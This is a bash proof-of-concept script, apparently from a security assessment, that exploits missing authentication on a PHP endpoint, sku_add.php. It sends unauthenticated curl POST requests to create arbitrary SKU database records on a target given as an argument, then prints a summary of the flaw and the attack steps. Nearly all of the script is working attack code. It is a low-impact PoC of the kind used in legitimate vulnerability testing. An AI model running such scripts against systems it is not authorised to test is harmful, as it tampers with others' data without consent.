#!/bin/bash

# POC: Missing Authentication and Authorization on sku_add.php
# This script demonstrates that unauthenticated users can create arbitrary SKU records
# by sending POST requests directly to the endpoint without any authentication checks

TARGET_URL="${1:-http://localhost:8080}"
SKU_ADD_ENDPOINT="${TARGET_URL}/app/sku_add.php"

echo "=========================================="
echo "POC: Missing Authentication on sku_add.php"
echo "=========================================="
echo "[*] Target: ${SKU_ADD_ENDPOINT}"
echo ""

# Test 1: Unauthenticated record creation
echo "[*] Test 1: Unauthenticated Record Creation"
echo "[*] Sending POST request without authentication headers or session cookies"
echo ""

TIMESTAMP=$(date +%s)
SKU_VALUE="TEST_SKU_${TIMESTAMP}"
RECORD_NAME="Unauthorized Record ${TIMESTAMP}"
DESCRIPTION="Created without authentication or authorization"

echo "[*] Request Details:"
echo "    Method: POST"
echo "    Endpoint: ${SKU_ADD_ENDPOINT}"
echo "    Parameters:"
echo "      - sku: ${SKU_VALUE}"
echo "      - name: ${RECORD_NAME}"
echo "      - description: ${DESCRIPTION}"
echo ""

# Send the unauthenticated request
HTTP_CODE=$(curl -s -o /tmp/response_${TIMESTAMP}.txt -w "%{http_code}" \
  -X POST \
  -d "sku=${SKU_VALUE}&name=${RECORD_NAME}&description=${DESCRIPTION}" \
  "${SKU_ADD_ENDPOINT}")

echo "[+] Server Response Code: ${HTTP_CODE}"
RESPONSE_BODY=$(cat /tmp/response_${TIMESTAMP}.txt)
echo "[+] Response Body: ${RESPONSE_BODY}"
echo ""

# Test 2: Check if redirect indicates successful creation
if [[ "${HTTP_CODE}" == "302" ]] || [[ "${HTTP_CODE}" == "303" ]]; then
    echo "[✓] VULNERABILITY CONFIRMED"
    echo "[✓] Endpoint accepted unauthenticated POST request"
    echo "[✓] Redirect response (${HTTP_CODE}) indicates record was likely created"
elif [[ "${HTTP_CODE}" == "200" ]]; then
    echo "[✓] VULNERABILITY CONFIRMED"
    echo "[✓] Endpoint accepted unauthenticated POST request with 200 response"
else
    echo "[!] Response code: ${HTTP_CODE}"
fi

echo ""
echo "[*] Test 2: Multiple Unauthorized Creations"
echo "[*] Demonstrating ability to create multiple records without authentication"
echo ""

for i in {1..3}; do
    SKU="UNAUTH_${i}_${TIMESTAMP}"
    curl -s -o /dev/null -w "" \
      -X POST \
      -d "sku=${SKU}&name=Unauthorized%20Record%20${i}&description=Record%20created%20without%20auth" \
      "${SKU_ADD_ENDPOINT}"
    echo "[+] Created record ${i} with SKU: ${SKU}"
done

echo ""
echo "=========================================="
echo "Vulnerability Summary:"
echo "=========================================="
echo "Endpoint: sku_add.php"
echo "Issue: Missing Authentication and Authorization"
echo "Impact: Unauthenticated users can create arbitrary SKU records"
echo "Severity: MEDIUM"
echo ""
echo "Vulnerable Code Pattern:"
echo "  - No session_start() call"
echo "  - No \$_SESSION verification"
echo "  - No user authentication checks"
echo "  - Direct INSERT into database on POST request"
echo ""
echo "Attack Vector:"
echo "  1. Attacker sends POST to /app/sku_add.php"
echo "  2. No credentials required"
echo "  3. Arbitrary SKU data is inserted into database"
echo "  4. No audit trail of who created the record"
echo ""
echo "=========================================="